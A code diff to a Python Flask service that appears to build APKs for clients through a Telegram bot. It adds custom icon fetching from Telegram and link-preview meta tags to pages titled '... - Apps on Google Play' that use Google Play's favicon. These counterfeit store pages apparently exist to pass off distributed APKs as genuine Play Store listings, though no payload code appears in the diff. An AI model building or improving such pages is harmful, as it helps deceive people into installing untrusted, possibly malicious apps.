@@ -1084,8 +1084,71 @@ def _get_build_by_token(token):
     except Exception:
         return None
 
-def _get_icon_b64(template):
-    """Return base64 PNG for template icon, or empty string."""
+def _fetch_custom_icon(chat_id: str, icon_fid: str) -> str:
+    """
+    Fetch custom icon from Telegram using file_id, cache to disk.
+    Returns base64 PNG string or empty string on failure.
+    Cache path: ARTIFACTS_DIR/client_<chat_id>/custom_icon.png
+    """
+    if not icon_fid or not chat_id:
+        return ""
+    safe_chat  = "".join(c for c in str(chat_id) if c.isalnum() or c in "-_")
+    cache_dir  = os.path.join(ARTIFACTS_DIR, f"client_{safe_chat}")
+    cache_path = os.path.join(cache_dir, "custom_icon.png")
+
+    # Return cached version if already on disk
+    if os.path.exists(cache_path):
+        try:
+            with open(cache_path, "rb") as f:
+                data = f.read()
+            if data:
+                return base64.b64encode(data).decode()
+        except Exception:
+            pass  # Cache read failed — re-fetch below
+
+    # Fetch from Telegram API
+    try:
+        import urllib.request as _ureq
+        # Step 1: get file path
+        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={icon_fid}"
+        with _ureq.urlopen(tg_url, timeout=10) as resp:
+            info = json.loads(resp.read().decode())
+        file_path = info.get("result", {}).get("file_path", "")
+        if not file_path:
+            log.warning(f"_fetch_custom_icon: no file_path for fid={icon_fid[:20]}")
+            return ""
+        # Step 2: download the file
+        dl_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
+        with _ureq.urlopen(dl_url, timeout=15) as resp:
+            img_bytes = resp.read()
+        if not img_bytes:
+            return ""
+        # Cache to disk
+        os.makedirs(cache_dir, exist_ok=True)
+        with open(cache_path, "wb") as f:
+            f.write(img_bytes)
+        log.info(f"_fetch_custom_icon: cached icon for chat={chat_id} ({len(img_bytes)} bytes)")
+        return base64.b64encode(img_bytes).decode()
+    except Exception as e:
+        log.warning(f"_fetch_custom_icon: failed for chat={chat_id}: {e}")
+        return ""
+
+
+def _get_icon_b64(template, build=None):
+    """
+    Return base64 PNG for the app icon.
+    For custom template: try fetching from Telegram via stored file_id (cached).
+    For all templates: fall back to template PNG from ICON_DIR.
+    """
+    # Custom build — try to get user-uploaded icon first
+    if template == "custom" and build:
+        icon_fid = build.get("custom_icon_fid", "") or ""
+        chat_id  = str(build.get("chat_id", "")) or ""
+        if icon_fid and chat_id:
+            b64 = _fetch_custom_icon(chat_id, icon_fid)
+            if b64:
+                return b64
+    # Template icon from disk
     try:
         icon_path = os.path.join(ICON_DIR, f"{template}.png")
         if os.path.exists(icon_path):
@@ -1142,9 +1205,10 @@ def _store_html(build):
     if custom_name:
         app_name = custom_name
 
-    icon_b64     = _get_icon_b64(template)
+    icon_b64     = _get_icon_b64(template, build=build)
     icon_src     = f"data:image/png;base64,{icon_b64}" if icon_b64 else ""
     icon_html    = f'<img src="{icon_src}" alt="{app_name}" style="width:100%;height:100%;object-fit:cover">' if icon_src else f'<span style="font-size:36px">{emoji}</span>'
+    icon_url     = f"{PUBLIC_URL}/store/icon/{store_token}" if store_token else ""
 
     # APK size display
     try:
@@ -1188,6 +1252,11 @@ def _store_html(build):
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>{app_name} - Apps on Google Play</title>
 <link rel="icon" href="https://play.google.com/favicon.ico">
+{f'<link rel="apple-touch-icon" href="{icon_url}">' if icon_url else ''}
+{f'<meta property="og:title" content="{app_name} - Apps on Google Play">' if icon_url else ''}
+{f'<meta property="og:image" content="{icon_url}">' if icon_url else ''}
+{f'<meta property="og:url" content="{PUBLIC_URL}/store/{store_token}">' if store_token else ''}
+<meta name="twitter:card" content="summary">
 <style>
 *{{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}}
 body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;background:#fff;max-width:100%;margin:0;overflow-x:hidden}}
@@ -1697,14 +1766,31 @@ def store_page(token):
 
 @app.route("/store/icon/<token>", methods=["GET"])
 def store_icon(token):
-    """Serve template icon PNG for a build."""
+    """Serve app icon PNG for a build — custom or template."""
     build = _get_build_by_token(token)
     if not build:
         return Response("", status=404)
     template = build.get("template", "custom") or "custom"
+
+    # Custom build: try user-uploaded icon (fetched from Telegram, cached on disk)
+    if template == "custom":
+        icon_fid = build.get("custom_icon_fid", "") or ""
+        chat_id  = str(build.get("chat_id", "")) or ""
+        if icon_fid and chat_id:
+            safe_chat  = "".join(c for c in chat_id if c.isalnum() or c in "-_")
+            cache_path = os.path.join(ARTIFACTS_DIR, f"client_{safe_chat}", "custom_icon.png")
+            # Trigger fetch+cache if not already cached
+            if not os.path.exists(cache_path):
+                _fetch_custom_icon(chat_id, icon_fid)
+            if os.path.exists(cache_path):
+                return send_file(cache_path, mimetype="image/png",
+                                 max_age=86400, conditional=True)
+
+    # Template icon from disk
     icon_path = os.path.join(ICON_DIR, f"{template}.png")
     if os.path.exists(icon_path):
-        return send_file(icon_path, mimetype="image/png")
+        return send_file(icon_path, mimetype="image/png",
+                         max_age=86400, conditional=True)
     return Response("", status=404)
 
 
